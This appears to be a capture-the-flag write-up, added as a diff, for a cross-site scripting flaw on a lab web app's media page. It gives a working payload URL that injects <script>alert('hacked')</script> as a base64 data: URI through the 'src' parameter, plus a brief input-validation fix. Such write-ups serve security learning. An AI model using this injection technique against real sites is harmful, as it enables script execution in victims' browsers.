@@ -1,0 +1,10 @@
+The vulnerability is on the media page, you can access it by clicking on the 3th image in the home page
+In the url, http://192.168.1.64/?page=media&src=nsa, the image to display is searched by the fild in the url "src".
+So what if we try to execute something, like <script>alert("hacked")</script>, by sending it in base64 ?
+
+you'll have to execute the url: http://192.168.1.64/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=
+PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4= is the base64 for <script>alert("hacked")</script>
+
+now, you'll get the flag displayed with an image.
+
+how to correct: - validate the input entered by users and sanitize it
